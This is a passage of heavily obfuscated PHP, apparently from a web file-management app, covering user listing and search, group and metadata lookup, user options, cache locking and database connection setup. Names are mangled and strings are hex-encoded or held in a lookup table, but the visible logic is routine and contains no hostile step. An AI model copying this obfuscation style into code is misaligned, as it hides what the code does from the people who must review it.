(!$úüØ´¨Ú || !$í¨¼Òİå) { return !1; } $Ë´–Û¨ö = array($Ó›İêÛÙ[1761] => $Â¼’è°, $Ó›İêÛÙ[2063] => $í¨¼Òİå); return Model($Ó›İêÛÙ[2065])->where($Ë´–Û¨ö)->delete(); } public function listData() { $”çô¿ºÊ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($”çô¿ºÊ[$_SERVER[Š—Â“œÔ][447]]); return $”çô¿ºÊ; } public function listByID($™©¼…Ø‡) { $³æò–Šó =& $_SERVER[Š—Â“œÔ]; if (!$™©¼…Ø‡) { return; } $Ÿ»ùã¯ = array($³æò–Šó[1770] => array($³æò–Šó[7], $™©¼…Ø‡)); $–ñ…»À‰ = $this->where($Ÿ»ùã¯)->select(); $–ñ…»À‰ = array_sort_keep($–ñ…»À‰, $³æò–Šó[1770], $™©¼…Ø‡); $this->_listDataApply($–ñ…»À‰); return $–ñ…»À‰; } public function listByGroup($êÙÔùó¯ = 0, $ä³›Åø = array()) { $Ï•¤®öş =& $_SERVER[Š—Â“œÔ]; $£ìÌËŸî = $Ï•¤®öş[12]; $³ØúûÒÀ = array(); if ($êÙÔùó¯) { $³ØúûÒÀ = array($Ï•¤®öş[2497] => intval($êÙÔùó¯)); $£ìÌËŸî = "\114\105\x46\124\40\112\117\x49\x4e\40{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\x72\x6f\x75\160\40\165\163\145\x72\137\x67\x72\x6f\165\160\x20\157\156\x20\165\x73\145\x72\56\165\x73\x65\162\x49\x44\x20\75\40\x75\x73\145\x72\x5f\147\162\x6f\x75\160\56\165\163\145\x72\x49\104"; $›ú‘êƒÓ = Input::get($Ï•¤®öş[532], null, $Ï•¤®öş[12]) ? $Ï•¤®öş[12] : $Ï•¤®öş[2498]; } if (isset($ä³›Åø[$Ï•¤®öş[817]])) { $³ØúûÒÀ[$Ï•¤®öş[2499]] = $ä³›Åø[$Ï•¤®öş[817]]; } $‰²¹ºØÃ = $this->_makeOrder($›ú‘êƒÓ)->field($Ï•¤®öş[2500])->where($³ØúûÒÀ)->join($£ìÌËŸî)->selectPage(50); $this->_listDataApply($‰²¹ºØÃ[$Ï•¤®öş[447]]); return $‰²¹ºØÃ; } private function _makeOrder($±ÑÒÎ“ = '') { $ Ïğ‚°å =& $_SERVER[Š—Â“œÔ]; $¾·òËå = array($ Ïğ‚°å[1770], $ Ïğ‚°å[32], $ Ïğ‚°å[1959], $ Ïğ‚°å[2178], $ Ïğ‚°å[1931], $ Ïğ‚°å[233]); $Ğä¶¥ÉÒ = array($ Ïğ‚°å[525] => $ Ïğ‚°å[526], $ Ïğ‚°å[527] => $ Ïğ‚°å[528]); $§™”£¨ò = Input::get($ Ïğ‚°å[532], $ Ïğ‚°å[7], $ Ïğ‚°å[1761], $¾·òËå); $ã‡‚ÑÇ‚ = Input::get($ Ïğ‚°å[533], $ Ïğ‚°å[7], $ Ïğ‚°å[2066], array($ Ïğ‚°å[2066], $ Ïğ‚°å[527])); $ã‡‚ÑÇ‚ = $Ğä¶¥ÉÒ[$ã‡‚ÑÇ‚]; $±ÑÒÎ“ = $±ÑÒÎ“ . "\165\163\x65\162\56{$§™”£¨ò}\x20{$ã‡‚ÑÇ‚}\x2c\40\165\x73\x65\x72\x2e\165\x73\x65\162\111\104\x20\x61\163\x63"; return $this->alias($ Ïğ‚°å[2194])->order($±ÑÒÎ“); } public function listSearch($£Ä¼³Ìµ) { $ÔíœòåŞ =& $_SERVER[Š—Â“œÔ]; $…Æ™±Ùç = trim($£Ä¼³Ìµ[$ÔíœòåŞ[2069]]); $ Áö˜§§ = explode($ÔíœòåŞ[53], $…Æ™±Ùç); if (!$…Æ™±Ùç || count($ Áö˜§§) == 1) { return $this->listSearchNow($£Ä¼³Ìµ); } $Ùò¯„ì = array($ÔíœòåŞ[447] => array()); foreach ($ Áö˜§§ as $‹Ë§­ğñ) { if (!trim($‹Ë§­ğñ)) { continue; } $£Ä¼³Ìµ[$ÔíœòåŞ[2069]] = $‹Ë§­ğñ; $³ÃÊ“Ì‹ = $this->listSearchNow($£Ä¼³Ìµ); $Ùò¯„ì[$ÔíœòåŞ[447]] = array_merge($Ùò¯„ì[$ÔíœòåŞ[447]], $³ÃÊ“Ì‹[$ÔíœòåŞ[447]]); } $Ùò¯„ì[$ÔíœòåŞ[447]] = array_unique_by_key($Ùò¯„ì[$ÔíœòåŞ[447]], $ÔíœòåŞ[1770]); $Ùò¯„ì[$ÔíœòåŞ[444]] = array($ÔíœòåŞ[445] => count($Ùò¯„ì[$ÔíœòåŞ[447]]), $ÔíœòåŞ[441] => 20, $ÔíœòåŞ[430] => 1, $ÔíœòåŞ[446] => 1); return $Ùò¯„ì; } public function listSearchNow($Ş’Öí¶Ö) { $åÕÇÕÏÊ =& $_SERVER[Š—Â“œÔ]; $”‡Ì—Åß = trim($Ş’Öí¶Ö[$åÕÇÕÏÊ[2069]]); $¨ññ÷ñ° = isset($Ş’Öí¶Ö[$åÕÇÕÏÊ[2070]]) ? $Ş’Öí¶Ö[$åÕÇÕÏÊ[2070]] : !1; $”‡Ì—Åß = str_replace($åÕÇÕÏÊ[2071], $åÕÇÕÏÊ[2072], trim($”‡Ì—Åß)); $½’îÈõ  = array($åÕÇÕÏÊ[32] => array($åÕÇÕÏÊ[461], "\x25{$”‡Ì—Åß}\x25"), $åÕÇÕÏÊ[382] => array($åÕÇÕÏÊ[461], "{$”‡Ì—Åß}\45"), $åÕÇÕÏÊ[2266] => array($åÕÇÕÏÊ[461], "{$”‡Ì—Åß}\45"), $åÕÇÕÏÊ[1074] => $åÕÇÕÏÊ[2073]); if (Input::check($”‡Ì—Åß, $åÕÇÕÏÊ[388])) { $½’îÈõ [$åÕÇÕÏÊ[1770]] = array($åÕÇÕÏÊ[461], "{$”‡Ì—Åß}\45"); $½’îÈõ [$åÕÇÕÏÊ[2482]] = array($åÕÇÕÏÊ[461], "{$”‡Ì—Åß}\x25"); } if (!$”‡Ì—Åß) { $½’îÈõ  = array(); } if (isset($Ş’Öí¶Ö[$åÕÇÕÏÊ[817]])) { $½’îÈõ [$åÕÇÕÏÊ[817]] = $Ş’Öí¶Ö[$åÕÇÕÏÊ[817]]; } $½’îÈõ  = $this->parseWhereLike($½’îÈõ ); $æµëÀÖÍ = $this->_makeOrder()->where($½’îÈõ )->selectPage(20); if (!$æµëÀÖÍ || count($æµëÀÖÍ[$åÕÇÕÏÊ[447]]) < 5 && Input::check($”‡Ì—Åß, $åÕÇÕÏÊ[395])) { $Ø÷üè’° = $this->_searchFromMeta($åÕÇÕÏÊ[539], $”‡Ì—Åß, 10); $ ù—å½õ = $this->_searchFromMeta($åÕÇÕÏÊ[540], $”‡Ì—Åß, 10); $¿öşÍÖ¨ = array_merge($Ø÷üè’°, $ ù—å½õ, $æµëÀÖÍ[$åÕÇÕÏÊ[447]]); $æµëÀÖÍ[$åÕÇÕÏÊ[447]] = array_unique_by_key($¿öşÍÖ¨, $åÕÇÕÏÊ[1770]); $æµëÀÖÍ[$åÕÇÕÏÊ[444]][$åÕÇÕÏÊ[445]] = count($æµëÀÖÍ[$åÕÇÕÏÊ[447]]); $æµëÀÖÍ[$åÕÇÕÏÊ[444]][$åÕÇÕÏÊ[446]] = ceil($æµëÀÖÍ[$åÕÇÕÏÊ[444]][$åÕÇÕÏÊ[445]] / $æµëÀÖÍ[$åÕÇÕÏÊ[444]][$åÕÇÕÏÊ[441]]); } $this->_listDataApply($æµëÀÖÍ[$åÕÇÕÏÊ[447]]); $this->_filterByGroup($æµëÀÖÍ, $¨ññ÷ñ°); return $æµëÀÖÍ; } private function _filterByGroup(&$œÊÛïã‚, $ØÛ„Ÿ¨) { $ŠÀ¸Àá =& $_SERVER[Š—Â“œÔ]; if (!$ØÛ„Ÿ¨) { return $œÊÛïã‚; } foreach ($œÊÛïã‚[$ŠÀ¸Àá[447]] as $®¢Úû‡ => &$ßŠãÑá‹) { $·²´âÌ = array_to_keyvalue($ßŠãÑá‹[$ŠÀ¸Àá[2163]], $ŠÀ¸Àá[12], $ŠÀ¸Àá[1971]); if (!in_array($ØÛ„Ÿ¨, $·²´âÌ)) { unset($œÊÛïã‚[$ŠÀ¸Àá[447]][$®¢Úû‡]); } } unset($ßŠãÑá‹); $œÊÛïã‚[$ŠÀ¸Àá[447]] = array_values($œÊÛïã‚[$ŠÀ¸Àá[447]]); $œÊÛïã‚[$ŠÀ¸Àá[444]] = array($ŠÀ¸Àá[2231] => count($œÊÛïã‚[$ŠÀ¸Àá[447]]), $ŠÀ¸Àá[2229] => $œÊÛïã‚[$ŠÀ¸Àá[444]][$ŠÀ¸Àá[441]], $ŠÀ¸Àá[2228] => 1, $ŠÀ¸Àá[2230] => 1); } private function _searchFromMeta($³â‡İ¨Á, $ˆ”¨ÚÏª, $§¤ÈŞ¿×) { $óØ»Íô =& $_SERVER[Š—Â“œÔ]; $ˆ”¨ÚÏª = strtolower($ˆ”¨ÚÏª); $ĞÌ¨†²ª = array($óØ»Íô[97] => $³â‡İ¨Á, $óØ»Íô[452] => array($óØ»Íô[461], "\45{$ˆ”¨ÚÏª}\45")); $ĞÌ¨†²ª = $this->parseWhereLike($ĞÌ¨†²ª); $˜íÑ£—Ÿ = Model($óØ»Íô[2501])->where($ĞÌ¨†²ª)->limit($§¤ÈŞ¿×)->select(); if (!$˜íÑ£—Ÿ) { return array(); } $˜íÑ£—Ÿ = array_to_keyvalue($˜íÑ£—Ÿ, $óØ»Íô[12], $óØ»Íô[1770]); $üúÓä·† = $this->where(array($óØ»Íô[1761] => array($óØ»Íô[7], $˜íÑ£—Ÿ)))->select(); if (!$üúÓä·†) { return array(); } return $üúÓä·†; } private function _listDataApplyItem($¤‰¢˜¥±) { $™È”é¢Õ = array($¤‰¢˜¥±); $this->_listDataApply($™È”é¢Õ); return $™È”é¢Õ[0]; } private function _listDataApply(&$›˜ŞÒÙ) { $‰„¨ï×â =& $_SERVER[Š—Â“œÔ]; if (!$›˜ŞÒÙ) { return; } array_remove_key($›˜ŞÒÙ, $‰„¨ï×â[963]); $Æ—Ñ‚â = array_to_keyvalue($›˜ŞÒÙ, $‰„¨ï×â[12], $‰„¨ï×â[1770]); $this->_listAppendGroup($›˜ŞÒÙ, $Æ—Ñ‚â); $this->_listAppendMeta($›˜ŞÒÙ, $Æ—Ñ‚â); $this->_listAppendSourceRoot($›˜ŞÒÙ, $Æ—Ñ‚â); } private function _listAppendSourceRoot(&$‘ĞßçĞ, $ÂûÍÄğ) { $¼Ÿ•úò =& $_SERVER[Š—Â“œÔ]; $ëÆ©óôÈ = Model($¼Ÿ•úò[892])->listSourceRoot(SourceModel::TYPE_USER, $ÂûÍÄğ); $ëÆ©óôÈ = array_to_keyvalue($ëÆ©óôÈ, $¼Ÿ•úò[571]); $ëÆ©óôÈ = array_remove_key($ëÆ©óôÈ, $¼Ÿ•úò[571]); foreach ($‘ĞßçĞ as &$öôŠ¡Íå) { $öôŠ¡Íå[$¼Ÿ•úò[90]] = $ëÆ©óôÈ[$öôŠ¡Íå[$¼Ÿ•úò[1770]]] ? $ëÆ©óôÈ[$öôŠ¡Íå[$¼Ÿ•úò[1770]]] : array(); } unset($öôŠ¡Íå); } private function _listAppendGroup(&$ìôÑÑªã, $ÏêŠ‚ø‡) { $âÏºÄ‡‰ =& $_SERVER[Š—Â“œÔ]; $àˆÜĞ·Õ = array($âÏºÄ‡‰[1770] => array($âÏºÄ‡‰[7], $ÏêŠ‚ø‡)); $Çë¨µè¼ = Model($âÏºÄ‡‰[2065])->where($àˆÜĞ·Õ)->select(); $„õà­£æ = array_to_keyvalue($Çë¨µè¼, $âÏºÄ‡‰[12], $âÏºÄ‡‰[1971]); $„õà­£æ = array_remove_value(array_unique($„õà­£æ), $âÏºÄ‡‰[230]); if (!$„õà­£æ || !$Çë¨µè¼) { return; } $àˆÜĞ·Õ = array($âÏºÄ‡‰[1971] => array($âÏºÄ‡‰[7], $„õà­£æ)); $šÏ’ãŸÃ = Model($âÏºÄ‡‰[2161])->field($âÏºÄ‡‰[2502])->where($àˆÜĞ·Õ)->select(); $šÏ’ãŸÃ = array_to_keyvalue($šÏ’ãŸÃ, $âÏºÄ‡‰[1971]); $Çë¨µè¼ = array_to_keyvalue_group($Çë¨µè¼, $âÏºÄ‡‰[1770]); foreach ($Çë¨µè¼ as &$­Ö³ø¶¬) { $åÇ¿±ä¬ = array(); foreach ($­Ö³ø¶¬ as $œÜ„ß) { if (!$œÜ„ß[$âÏºÄ‡‰[2079]]) { continue; } $ÛÚŞÍË = Model($âÏºÄ‡‰[573])->listData($œÜ„ß[$âÏºÄ‡‰[2079]]); $åÇ¿±ä¬[] = array($âÏºÄ‡‰[1971] => $œÜ„ß[$âÏºÄ‡‰[1971]], $âÏºÄ‡‰[2503] => $šÏ’ãŸÃ[$œÜ„ß[$âÏºÄ‡‰[1971]]][$âÏºÄ‡‰[32]], $âÏºÄ‡‰[586] => $šÏ’ãŸÃ[$œÜ„ß[$âÏºÄ‡‰[1971]]][$âÏºÄ‡‰[586]], $âÏºÄ‡‰[489] => $ÛÚŞÍË); } $­Ö³ø¶¬ = $åÇ¿±ä¬; } unset($­Ö³ø¶¬); foreach ($ìôÑÑªã as &$ï”°í¥ç) { $ï”°í¥ç[$âÏºÄ‡‰[2163]] = array(); if (isset($Çë¨µè¼[$ï”°í¥ç[$âÏºÄ‡‰[1770]]])) { $ï”°í¥ç[$âÏºÄ‡‰[2163]] = $Çë¨µè¼[$ï”°í¥ç[$âÏºÄ‡‰[1770]]]; } } unset($ï”°í¥ç); } public function userAppendGroup($‰„°µÁå) { $Ë³ë¾—š =& $_SERVER[Š—Â“œÔ]; if (!$‰„°µÁå) { return array(); } $this->_listAppendGroup($‰„°µÁå, array_to_keyvalue($‰„°µÁå, $Ë³ë¾—š[12], $Ë³ë¾—š[1770])); return $‰„°µÁå; } private function _listAppendMeta(&$òı×øŠ¾, $›è¸Ó…™) { $Ò ‹á˜ =& $_SERVER[Š—Â“œÔ]; $ØÓ ® = UserJobModel::JOB_KEY; $ŒõØ›ŠŠ = array($Ò ‹á˜[2483]); $ŠêÀ…à‘ = array($Ò ‹á˜[1770] => array($Ò ‹á˜[7], $›è¸Ó…™)); $¦Î–ò÷­ = Model($Ò ‹á˜[2481])->where($ŠêÀ…à‘)->select(); $¦Î–ò÷­ = array_to_keyvalue_group($¦Î–ò÷­, $Ò ‹á˜[1770]); foreach ($¦Î–ò÷­ as &$åı’ä‹) { $ú–™šÄ = array(); foreach ($åı’ä‹ as $²Á³±âŠ) { if (!in_array($²Á³±âŠ[$Ò ‹á˜[97]], $ŒõØ›ŠŠ)) { $ú–™šÄ[$²Á³±âŠ[$Ò ‹á˜[97]]] = $²Á³±âŠ[$Ò ‹á˜[452]]; } } $åı’ä‹ = $ú–™šÄ; } unset($åı’ä‹); $‚—ŸÖĞ• = Model($Ò ‹á˜[2504]); foreach ($òı×øŠ¾ as &$¥ÅŠğé›) { $ğî“ËÃú = array(); if (isset($¦Î–ò÷­[$¥ÅŠğé›[$Ò ‹á˜[1770]]])) { $ğî“ËÃú = $¦Î–ò÷­[$¥ÅŠğé›[$Ò ‹á˜[1770]]]; } $¥ÅŠğé›[$Ò ‹á˜[2505]] = array(); if (isset($ğî“ËÃú[$ØÓ ®])) { $¥ÅŠğé›[$Ò ‹á˜[2505]] = $‚—ŸÖĞ•->getUserJobInfo($ğî“ËÃú[$ØÓ ®]); } } unset($¥ÅŠğé›); } protected function groupUserAll($§Ô’ªîÜ) { $Ë’óƒê =& $_SERVER[Š—Â“œÔ]; if (!$§Ô’ªîÜ) { return !1; } $çÃÂ•½÷ = Model($Ë’óƒê[2065])->field($Ë’óƒê[1770])->where(array($Ë’óƒê[1971] => array($Ë’óƒê[7], $§Ô’ªîÜ)))->select(); $çÃÂ•½÷ = array_to_keyvalue($çÃÂ•½÷, $Ë’óƒê[12], $Ë’óƒê[1770]); return array_unique($çÃÂ•½÷); } public function userSearch($Á£ƒˆ÷ò, $”áÉÊ¦¨ = "\52") { return Model($_SERVER[Š—Â“œÔ][599])->where($Á£ƒˆ÷ò)->field($”áÉÊ¦¨)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($èÈİ›Ó”) { $ ù¤ÊÏ¶ =& $_SERVER[Š—Â“œÔ]; $À¥ç·§ = defined($ ù¤ÊÏ¶[2198]) && USER_ID ? USER_ID : $ ù¤ÊÏ¶[12]; return "\x55\x73\x65\162\117\160\164\x69\x6f\x6e\x5f{$èÈİ›Ó”}\x5f" . $À¥ç·§; } protected function filterWhere($ÅŠªïËÚ) { $½ÒœÃ©² =& $_SERVER[Š—Â“œÔ]; $ÅŠªïËÚ[$½ÒœÃ©²[1770]] = defined($½ÒœÃ©²[2198]) && USER_ID ? USER_ID : $½ÒœÃ©²[12]; return $ÅŠªïËÚ; } public function cacheRemoveUser($ú”úß©, $Š‹äğÛ) { return Cache::remove("\125\163\145\162\x4f\x70\x74\151\157\156\137{$ú”úß©}\137" . $Š‹äğÛ); } protected function optionDefault($äßó­ğû = '') { $¨™Î»æ =& $_SERVER[Š—Â“œÔ]; if ($äßó­ğû == $¨™Î»æ[12]) { return $GLOBALS[$¨™Î»æ[6]][$¨™Î»æ[2506]]; } if ($äßó­ğû == $¨™Î»æ[2507]) { return $GLOBALS[$¨™Î»æ[6]][$¨™Î»æ[2508]]; } } } goto AïÌí¥µœÚ; B¸£‹Üî—ù: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $³’·ü =& $_SERVER[Š—Â“œÔ]; $“ıÚª° = $GLOBALS[$³’·ü[6]][$³’·ü[426]]; self::$cachePath = $“ıÚª°[$³’·ü[232]][$³’·ü[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ï«Ü‹—, $¡‡Í¸ƒò = 0) { $ï°ˆ€“ =& $_SERVER[Š—Â“œÔ]; $ŸÖú¤¸ = microtime(!0); $İÓàğŠª = $ŸÖú¤¸ + $¡‡Í¸ƒò + 0.0001; $Úò¯Öá¸ = rtrim(self::$cachePath, $ï°ˆ€“[8]) . $ï°ˆ€“[932] . md5($ï«Ü‹—) . $ï°ˆ€“[929]; if (file_exists($Úò¯Öá¸) && filemtime($Úò¯Öá¸) && filemtime($Úò¯Öá¸) < time() - 10) { @unlink($Úò¯Öá¸); } do { if (file_exists($Úò¯Öá¸)) { cacheLockWait(); continue; } $¹ş’ŠçÊ = fopen($Úò¯Öá¸, $ï°ˆ€“[933]); if (!$¹ş’ŠçÊ) { return !1; } $È¹Ãì = flock($¹ş’ŠçÊ, LOCK_EX | LOCK_NB); self::$caches[$ï«Ü‹—] = array($ï°ˆ€“[934] => $¹ş’ŠçÊ, $ï°ˆ€“[232] => $Úò¯Öá¸); fwrite($¹ş’ŠçÊ, $İÓàğŠª); clearstatcache(); if ($¹ş’ŠçÊ && $È¹Ãì) { return !0; } cacheLockWait(); } while (microtime(!0) < $İÓàğŠª); $this->unlock($ï«Ü‹—); return !1; } public function lockGet($ìË§íäœ) { $¢ÆğºŞ =& $_SERVER[Š—Â“œÔ]; $¡§÷Ø§Ù = rtrim(self::$cachePath, $¢ÆğºŞ[8]) . $¢ÆğºŞ[932] . md5($ìË§íäœ) . $¢ÆğºŞ[929]; return file_exists($¡§÷Ø§Ù); } public function unlock($ò™´—¾õ) { $¬ãÅ”å½ =& $_SERVER[Š—Â“œÔ]; $ûÁ÷¨Æˆ = self::$caches[$ò™´—¾õ]; if (!$ûÁ÷¨Æˆ) { return; } @flock($ûÁ÷¨Æˆ[$¬ãÅ”å½[934]], LOCK_UN); @fclose($ûÁ÷¨Æˆ[$¬ãÅ”å½[934]]); @unlink($ûÁ÷¨Æˆ[$¬ãÅ”å½[232]]); unset(self::$caches[$ò™´—¾õ]); } } class CacheLockRedis { public function lock($º†©±„Œ, $Ü×œ¶ŠŞ = 10) { $ØÎ†›Ü = Cache::init(); $ñ™¤ÍËŸ = microtime(!0) + $Ü×œ¶ŠŞ; while (microtime(!0) < $ñ™¤ÍËŸ) { $ÀÑ†»Ù— = $ØÎ†›Ü->get($º†©±„Œ); if (!$ÀÑ†»Ù—) { $®Â¢ë¸ì = $ØÎ†›Ü->setLock($º†©±„Œ, $ñ™¤ÍËŸ, $Ü×œ¶ŠŞ); if ($®Â¢ë¸ì) { return !0; } } else { if ($ÀÑ†»Ù— < microtime(!0)) { $ØÎ†›Ü->set($º†©±„Œ, $ñ™¤ÍËŸ, $Ü×œ¶ŠŞ * 2); if ($ØÎ†›Ü->get($º†©±„Œ) === $ÀÑ†»Ù—) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ı£Óù›) { return Cache::init()->get($ı£Óù›); } public function unlock($ìÇè“É) { return Cache::init()->remove($ìÇè“É); } } class CacheLockMemcached { public function lock($£ŸŒ óü, $Ë¾•–‰ = 0) { $”—­‚­Ó = Cache::init(); $«“‡”µä = microtime(!0) + $Ë¾•–‰; while (microtime(!0) < $«“‡”µä) { $Å»Óï…¹ = $”—­‚­Ó->get($£ŸŒ óü); if (!$Å»Óï…¹ || $Å»Óï…¹ < microtime(!0)) { $Ñß‡ß» = $”—­‚­Ó->handle->add($£ŸŒ óü, $«“‡”µä, $Ë¾•–‰); if ($Ñß‡ß») { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÕğïÊóÈ) { return Cache::init()->get($ÕğïÊóÈ); } public function unlock($ëóúŒ’â) { return Cache::init()->remove($ëóúŒ’â); } } goto Dš¿¯¦œ«; EØË¢À¹˜Ü: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\145\161" => "\74\x3e", "\147\164" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\145\x6c\x74" => "\74\x3d", "\156\157\164\x6c\x69\153\x65" => "\x4e\x4f\124\x20\114\111\x4b\105", "\x6c\x69\153\x65" => "\114\x49\x4b\x45", "\x69\156" => "\111\116", "\x6e\157\164\x69\x6e" => "\x4e\117\124\x20\111\x4e", "\x6e\x6f\164\40\x69\156" => "\x4e\x4f\124\x20\x49\x4e", "\x62\x65\x74\x77\x65\x65\x6e" => "\102\105\124\127\x45\x45\116", "\x6e\x6f\x74\x62\145\x74\x77\x65\x65\x6e" => "\x4e\117\124\40\102\105\124\x57\x45\105\116", "\x6e\157\164\40\142\145\164\x77\145\145\156" => "\116\117\124\40\x42\105\x54\x57\105\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\103\124\x25\104\111\x53\x54\x49\116\103\124\x25\40\x25\x46\x49\105\114\x44\x25\40\x46\x52\117\115\40\x25\x54\x41\102\x4c\105\45\45\112\117\111\116\45\x25\x57\x48\x45\122\x45\x25\x25\107\122\x4f\125\x50\x25\45\110\x41\126\111\x4e\107\x25\x25\117\x52\104\x45\x52\x25\45\114\x49\x4d\111\x54\x25\40\x25\x55\x4e\111\x4f\116\x25\x25\103\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $§ëî¨™ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Š—Â“œÔ][1034], $§ëî¨™); } public function factory($òœ© ÛÂ = '') { $˜»¦«²¼ =& $_SERVER[Š—Â“œÔ]; $òœ© ÛÂ = $this->parseConfig($òœ© ÛÂ); if (empty($òœ© ÛÂ[$˜»¦«²¼[1035]])) { think_exception(think_lang($˜»¦«²¼[1036])); } $this->dbType = ucwords(strtolower($òœ© ÛÂ[$˜»¦«²¼[1035]])); $›ÇÈµ­è = $˜»¦«²¼[1037] . $this->dbType; if (class_exists($›ÇÈµ­è)) { $ƒ»Û›± = new $›ÇÈµ­è($òœ© ÛÂ); if ($˜»¦«²¼[1038] != strtolower($òœ© ÛÂ[$˜»¦«²¼[1035]])) { $ƒ»Û›±->dbType = strtoupper($this->dbType); } else { $ƒ»Û›±->dbType = $this->_getDsnType($òœ© ÛÂ[$˜»¦«²¼[990]]); } } else { think_exception(think_lang($˜»¦«²¼[1039]) . $˜»¦«²¼[1040] . $›ÇÈµ­è); } return $ƒ»Û›±; } public function __call($íÌŠËÈ, $„æİøã´) { if (method_exists($this, $íÌŠËÈ)) { return call_user_func_array(array($this, $íÌŠËÈ), $„æİøã´); } } protected function _getDsnType($Ä¢‡ÒÄ”) { $²†Ã–“š = explode($_SERVER[Š—Â“œÔ][4], $Ä¢‡ÒÄ”); $‹È”ÚÖ» = strtoupper(trim($²†Ã–“š[0])); return $‹È”ÚÖ»; } private function parseConfig($èã¤Âˆ‹ = '') { $¶ıóæıå =& $_SERVER[Š—Â“œÔ]; if (!empty($èã¤Âˆ‹) && is_string($èã¤Âˆ‹)) { $èã¤Âˆ‹ = $this->parseDSN($èã¤Âˆ‹); } elseif (is_array($èã¤Âˆ‹)) { $èã¤Âˆ‹ = array_change_key_case($èã¤Âˆ‹); $èã¤Âˆ‹ = array($¶ıóæıå[1035] => $èã¤Âˆ‹[$¶ıóæıå[1041]], $¶ıóæıå[962] => $èã¤Âˆ‹[$¶ıóæıå[1042]], $¶ıóæıå[963] => $èã¤Âˆ‹[$¶ıóæıå[1043]], $¶ıóæıå[960] => $èã¤Âˆ‹[$¶ıóæıå[1044]], $¶ıóæıå[961] => $èã¤Âˆ‹[$¶ıóæıå[1045]], $¶ıóæıå[21] => $èã¤Âˆ‹[$¶ıóæıå[1046]], $¶ıóæıå[990] => $èã¤Âˆ‹[$¶ıóæıå[1047]], $¶ıóæıå[17] => isset($èã¤Âˆ‹[$¶ıóæıå[1048]]) ? $èã¤Âˆ‹[$¶ıóæıå[1048]] : array()); } elseif (empty($èã¤Âˆ‹)) { if (think_config($¶ıóæıå[1049]) && $¶ıóæıå[1038] != strtolower(think_config($¶ıóæıå[1050]))) { $èã¤Âˆ‹ = $this->parseDSN(think_config($¶ıóæıå[1049])); } else { $èã¤Âˆ‹ = array($¶ıóæıå[1035] => think_config($¶ıóæıå[1050]), $¶ıóæıå[962] => think_config($¶ıóæıå[1051]), $¶ıóæıå[963] => think_config($¶ıóæıå[1052]), $¶ıóæıå[960] => think_config($¶ıóæıå[1053]), $¶ıóæıå[961] => think_config($¶ıóæıå[1054]), $¶ıóæıå[21] => think_config($¶ıóæıå[325]), $¶ıóæıå[990] => think_config($¶ıóæıå[1049]), $¶ıóæıå[17] => think_config($¶ıóæıå[1055])); } } return $èã¤Âˆ‹; } protected function initConnect($¿„ÍÅùÈ = true) { if (1 == think_config($_SERVER[Š—Â“œÔ][22])) { $this->_linkID = $this->multiConnect($¿„ÍÅùÈ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $…·ÏÑ±“ => $µÆ¶é¶) { $this->_linkID = $µÆ¶é¶; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($”³•§×ğ = false) { $åĞ°î‰² =& $_SERVER[Š—Â“œÔ]; static $ê©¤¼ûã = array(); static $À™®ëì = -1; if (empty($ê©¤¼ûã)) { foreach ($this->config as $£¦ÓÀø‡ => $îÀÁ­ªô) { $ê©¤¼ûã[$£¦ÓÀø‡] = explode($åĞ°î‰²[50], $îÀÁ­ªô); } } if (think_config($åĞ°î‰²[1056])) { if ($”³•§×ğ || think_config($åĞ°î‰²[473]) === !0) { $®“ù‡Ú† = floor(mt_rand(0, think_config($åĞ°î‰²[1057]) - 1)); $À™®ëì = $®“ù‡Ú†; } else { if (is_numeric(think_config($åĞ°î‰²[1058]))) { $®“ù‡Ú† = think_config($åĞ°î‰²[1058]); } else { $®“ù‡Ú† = floor(mt_rand(think_config($åĞ°î‰²[1057]), count($ê©¤¼ûã[$åĞ°î‰²[960]]) - 1)); } } } else { $®“ù‡Ú† = floor(mt_rand(0, count($ê©¤¼ûã[$åĞ°î‰²[960]]) - 1)); $À™®ëì = $®“ù‡Ú†; } $®“ù‡Ú† = $À™®ëì !== -1 ? $À™®ëì : $®“ù‡Ú†; $ÃÂ­½‡” = array($åĞ°î‰²[962] => isset($ê©¤¼ûã[$åĞ°î‰²[962]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[962]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[962]][0], $åĞ°î‰²[963] => isset($ê©¤¼ûã[$åĞ°î‰²[963]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[963]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[963]][0], $åĞ°î‰²[960] => isset($ê©¤¼ûã[$åĞ°î‰²[960]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[960]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[960]][0], $åĞ°î‰²[961] => isset($ê©¤¼ûã[$åĞ°î‰²[961]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[961]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[961]][0], $åĞ°î‰²[21] => isset($ê©¤¼ûã[$åĞ°î‰²[21]][$®“ù‡Ú†]) ? 